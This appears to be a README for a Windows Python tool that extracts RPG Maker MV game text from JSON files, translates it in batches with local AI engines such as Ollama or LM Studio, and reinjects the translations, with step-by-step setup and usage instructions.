# 🔄 rpgmaker-mv-ai-translate - Easy AI Translation for RPG Maker MV

[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen.svg)](https://github.com/Ruptureconfectionery561/rpgmaker-mv-ai-translate)

---

## 📋 About This App

rpgmaker-mv-ai-translate is a simple tool that helps you translate your RPG Maker MV game text using AI. It extracts your game's text from JSON files, translates in batches, then safely puts the translations back. You don’t need to edit files by hand or know how to program.

This tool works on Windows and uses Python behind the scenes. You can translate game dialogues and menus quickly without worrying about breaking your game files.

---

## 📂 What It Does

- Extracts your RPG Maker MV text from JSON files automatically.
- Sends text to AI translation engines in manageable groups.
- Reinjects translated text into the original game files without errors.
- Supports machine translation tools like LM Studio and Ollama.
- Lets you keep your original game structure intact.

---

## 🖥️ System Requirements

To run this app on Windows, make sure you have:

- Windows 10 or newer (64-bit recommended)
- At least 4 GB of RAM
- 200 MB of free hard drive space
- Python 3.8 or later (an easy installer is included)
- Internet access for AI translation services (optional based on setup)

---

## 🚀 Getting Started

Follow these steps to get rpgmaker-mv-ai-translate running on your Windows computer.

### 1. Download the App

Visit this page to download the app:

[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue.svg)](https://github.com/Ruptureconfectionery561/rpgmaker-mv-ai-translate)

Click on the green "Code" button, then select "Download ZIP". Save the ZIP file to your desktop or a folder you can find easily.

### 2. Extract Files

Locate the downloaded ZIP file. Right-click it and select "Extract All...". Choose a folder like your desktop or documents to extract the files.

You should now have a folder named `rpgmaker-mv-ai-translate` with many files inside.

### 3. Install Python

If you do not have Python installed:  

- Open your browser and go to https://www.python.org/downloads/windows/
- Download the latest Python 3.8 or newer Windows installer.
- Run the installer and **make sure to check** the box that says "Add Python to PATH".
- Follow the prompts to complete installation.

### 4. Open Command Prompt

- Press the Windows key + R.
- Type `cmd` and press Enter.
- A black window will open (this is Command Prompt).

### 5. Navigate to the Folder

In the Command Prompt window, type this command and press Enter:

```
cd path\to\rpgmaker-mv-ai-translate
```

Replace `path\to` with the actual folder location where you extracted the app. For example:

```
cd Desktop\rpgmaker-mv-ai-translate
```

### 6. Install Required Packages

Type the following command and press Enter:

```
pip install -r requirements.txt
```

This installs all the parts the app needs to run.

### 7. Run the App

Type this command and press Enter:

```
python translate.py
```

This starts the app. Follow the simple on-screen instructions to select your RPG Maker MV game folder and choose the translation options.

---

## 🔄 Usage Details

- Place your RPG Maker MV project folder somewhere easy to access.
- When prompted, select the folder containing your game’s JSON files.
- The app will scan and show the text it will translate.
- Choose your preferred AI translation service.
- The app processes text in batches to keep translations steady and reliable.
- Translations are safely placed back into your game files.
- You can back up your original files before starting.

---

## 🔧 Troubleshooting

- If the app says Python is not found, check you installed Python and selected "Add to PATH".
- If you see errors about missing packages, run `pip install -r requirements.txt` again.
- If translation seems slow or fails, check your internet connection or AI service setup.
- For unexpected errors, close the app and try running it again.
- Always back up your game folder before translating.

---

## ⚙️ Configuration Options

You can customize several options in the app’s settings:

- **Batch size:** Controls how many sentences translate at once. Smaller batches can reduce errors.
- **Translation engine:** Switch between supported AI services like LM Studio or Ollama.
- **Backup:** Choose whether to make automatic backups before translation.
- **Output folder:** Set where translated files are saved.

These options appear in the app’s menu after starting the program.

---

## 🛠️ Advanced Use

For users familiar with command line tools, rpgmaker-mv-ai-translate supports arguments to automate certain tasks.

Example:

```
python translate.py --input "C:\Games\MyRPG" --engine "ollama" --batch 50
```

This command runs the app on the `MyRPG` folder using Ollama with batch size 50 without prompts.

Check the README inside the folder for all commands and flags.

---

## 📁 Folder Structure

After extraction, your folder will look like this:

- `translate.py` — main program file  
- `requirements.txt` — list of Python packages needed  
- `README.md` — detailed instructions  
- `config.json` — app settings and options  
- `examples` — sample JSON files for testing  
- `utils` — helper scripts for JSON extraction and reinjection  

---

## 🔗 Useful Links

- Download and install from:  
  https://github.com/Ruptureconfectionery561/rpgmaker-mv-ai-translate
- Python official site: https://www.python.org/downloads/windows/
- RPG Maker MV official: https://www.rpgmakerweb.com/products/rpg-maker-mv
- AI translation tools supported: LM Studio and Ollama

---

## 🗂️ Supported File Types

This tool works primarily with:

- `.json` files that contain your game’s dialogue and menus.
- It does not modify game executables or image files.

Keep your original files safe by not editing them outside the app.

---

## 🔐 Security and Privacy

This app only reads and writes to files inside your selected folder. It does not send data anywhere unless you use online AI services for translation. If you prefer, you can use local AI models like LM Studio to keep everything offline.

---

## 🚩 Common Issues

- **File access errors:** Make sure the game folder is not open in another program.
- **Incorrect translations:** Try lowering batch size or switch translation engines.
- **Slow performance:** Close other heavy programs or run on a faster PC.

---

## 📚 Additional Help

Look inside the `examples` folder for sample files to practice on before using your own game files. The `README.md` in the repository explains advanced features for power users.

For questions from experienced users, you can visit the GitHub Discussions page of the repository.

---

[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen.svg)](https://github.com/Ruptureconfectionery561/rpgmaker-mv-ai-translate)